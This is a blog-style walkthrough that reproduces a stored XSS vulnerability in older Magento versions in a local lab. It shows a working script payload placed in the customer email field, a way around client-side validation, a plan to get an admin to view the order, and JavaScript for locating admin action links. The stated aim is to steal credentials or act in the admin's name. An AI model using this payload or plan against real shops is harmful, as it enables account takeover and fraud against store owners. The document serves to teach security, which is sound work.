### Let's Exploit: Magento < 1.9.2.3!

#### Why?

A [friend of mine] sent me an [interesting advisory] the other day, 
demonstrating that there was an XSS exploit for the eCommerce platform 
Magento. I like security advisories, mainly because it's an interesting 
challenge and a good way to learn more about the underlying frameworks 
you're using. Since it was a lot of fun to [exploit wordpress], I 
figure'd I'd try out this XSS exploit. It should go without saying, but 
don't try this on systems that aren't yours, or you'll be violating the 
[law]. 

#### The plan

As pointed out in the [interesting advisory], this is a flaw that has to 
be triggered by an administrator checking on an order. So in our pretend 
scenario we have two types of exploits going on:

1. Taking advantage of the vulnerability itself 
2. Convincing the admin to check your order

Both of these are likely to be fairly easy given the nature of Magento. 
Calling or emailing an adminstrator in reference to your order would get 
any well-intentioned admin to check it out. And the first is trivially 
done according to the advisery, by using the quoted form of an email 
address for your client account. So our attack plan is simple: 

1. Setup our server to receive information
2. Perform exploit and call up our friendly admin
3. Steal their credentials or perform actions under their name

#### Setup

First off, we need to download a version of magento that isn't patched, 
so we can grab any copy of magento that is less than 1.9.2.3 from the 
[downloads page]. I had to create an account to download the software, 
so do that if you need to (use [guerrillamail] if you need a quick 
email address to use). Then [setup magento]. In my case I'll be using 
[apache] with the following host setup:

	# My New Magento Install! Nothing bad could happen :D 
	<VirtualHost *:80>
	    Servername local.magento.sec
	    ErrorLog /tmp/error.log
	    DocumentRoot /path/to/magento
	    <Directory /path/to/magento >
	        Options Indexes FollowSymLinks MultiViews
	        AllowOverride All
	        Order allow,deny
	        allow from all
	    </Directory>
	</VirtualHost>

	#My Evil domain that will exploit the poor thing:
	<VirtualHost *:80>
	    Servername local.evil.sec
		CustomLog /tmp/exploit.log combined
	    DocumentRoot /tmp
	    <Directory /tmp >
	        Order allow,deny
	        allow from all
	    </Directory>
	</VirtualHost>


And then setup your hosts file appropriately:

	127.0.0.1 local.magento.sec local.evil.sec

And starting up apache and navigating to your local site should give you 
the installation screen and you can follow the instructions to [setup magento].
In my case, I had to update some permissions and install the php5-gd 
package on my system before being able to run magento. Your mileage may 
vary. Also, installing magento is _slow_, the database has over 300 
tables in the base install, be patient as you install it. 

Once you're setup, you should be able to log in to your admin panel and 
see that magento wants to update:

<img width="100%" src="/images/tech-blog/magento-sec.jpg">

Ignoring that, [create a product] or two and verify that your site is 
working properly. 

#### Confirming the exploit

Before we do anything complicated, we want to perform a smoke test to 
make sure that we can trigger the problem ourselves. We'll do the same 
test that the advisory did and simple alert on the page by using the 
email `"><script>alert(1);</script>"@sucuri.net`. When you do this 
from the checkout page you'll get an error saying you it's not a valid 
email. However, this is only a front end check that we can trivially 
avoid by editing the HTML and removing the attributes the JS relys on 
to validate:

<img width="100%" src="/images/tech-blog/magento-client-side-validation.jpg">

Click through the rest of the steps and place your order.

<img width="100%" src="/images/tech-blog/magento-order.jpg">

Then in the admin panel navigate to sales and your orders and verify 
that the exploit happens:

<img width="100%" src="/images/tech-blog/magento-success.jpg">

You'll see the pop-up twice before the page fully loads. Now the real 
question is _what can we do?_.

#### Getting dirty

The first thing that comes to my mind is to attempt to steal the session 
of the admin user. But a quick look at the cookies of the page will tell 
us that such a thing won't work since the cookies are HTTP-Only:

<img width="100%" src="/images/tech-blog/magento-cookies.jpg">

So that's out, however inspecting the HTML shows a rather regular 
structure for certain admin commands:

	<p class="form-buttons">
		<button id="id_5bb472e5bb25f919ca7b95b3a304d224" title="Back" type="button" class="scalable back" 
			onclick="setLocation('http://local.magento.sec/index.php/admin/sales_order/index/order_id/1/key/5aeb202c9d51198f1b4b0788e0c50a61/')" style=""><span><span><span>Back</span></span></span>
		</button>
		<button id="id_3355e9ec801079ee9b3194f57af04a44" title="Edit" type="button" class="scalable " onclick="deleteConfirm('Are you sure? This order will be canceled and a new one will be created instead', 'http://local.magento.sec/index.php/admin/sales_order_edit/start/order_id/1/key/0df771d6ae3dbf52857146c042c06c00/');" style=""><span><span><span>Edit</span></span></span>
		</button>
		<button id="id_ac12d3d0ac767669706ad4e51f687eae" title="Cancel" type="button" class="scalable " onclick="deleteConfirm('Are you sure you want to cancel this order?', 'http://local.magento.sec/index.php/admin/sales_order/cancel/order_id/1/key/d9ea372dfe912a23c9031d4f3e8aa543/')" style=""><span><span><span>Cancel</span></span></span>
		</button>
		<button id="id_aa5c8f6278070f62165cb53a5e8964f9" title="Send Email" type="button" class="scalable " onclick="confirmSetLocation('Are you sure you want to send order email to customer?', 'http://local.magento.sec/index.php/admin/sales_order/email/order_id/1/key/1736650851982c38dcde0a3d93b382bd/')" style=""><span><span><span>Send Email</span></span></span>
		</button>
		<button id="id_b198d2919ff450e2a29136768b063a81" title="Hold" type="button" class="scalable " 
			onclick="setLocation('http://local.magento.sec/index.php/admin/sales_order/hold/order_id/1/key/c6864a29f4d310e98920144c29be0ff9/')" style=""><span><span><span>Hold</span></span></span>
		</button>
		<button id="id_52da78b79585bfb28e5e8bc1eca099dd" title="Invoice" type="button" class="scalable go" 
			onclick="setLocation('http://local.magento.sec/index.php/admin/sales_order_invoice/start/order_id/1/key/ef4e7af79a213cfe25ba01c61d2ba574/')" style=""><span><span><span>Invoice</span></span></span>
		</button>
		<button id="id_c77539b52e8216094a7b6af471566330" title="Ship" type="button" class="scalable go" 
			onclick="setLocation('http://local.magento.sec/index.php/admin/sales_order_shipment/start/order_id/1/key/80d4d3fa8e5236a7fb44df46342016df/')" style=""><span><span><span>Ship</span></span></span>
		</button>
	</p>

So using javascript we can grab the `Ship` button:
	
	var l = document.getElementsByTagName('button')
	for(i in l) { 
		if(l[i].hasOwnProperty('title')) { 
			if(x.title == "Ship") { 
				console.log(l[i])
			}
		}
	}

Which given the above will output the expected:

	<button id="id_c77539b52e8216094a7b6af471566330" title="Ship" type="button" class="scalable go" 
			onclick="setLocation('http://local.magento.sec/index.php/admin/sales_order_shipment/start/order_id/1/key/80d4d3fa8e5236a7fb44df46342016df/')" style=""><span><span><span>Ship</span></span></span>
	</button>



[friend of mine]:http://www.seancperkins.com
[interesting advisory]:https://blog.sucuri.net/2016/01/security-advisory-stored-xss-in-magento.html
[downloads page]:https://www.magentocommerce.com/download
[exploit wordpress]:/tech-blog/compromising-wordpress
[law]:http://www.leginfo.ca.gov/cgi-bin/displaycode?section=pen&group=00001-01000&file=484-502.9
[guerrillamail]:https://www.guerrillamail.com/
[setup magento]:https://www.siteground.com/tutorials/magento/magento_installation.htm
[apache]:https://www.apache.org/
[create a product]:https://www.siteground.com/tutorials/magento/magento_product.htm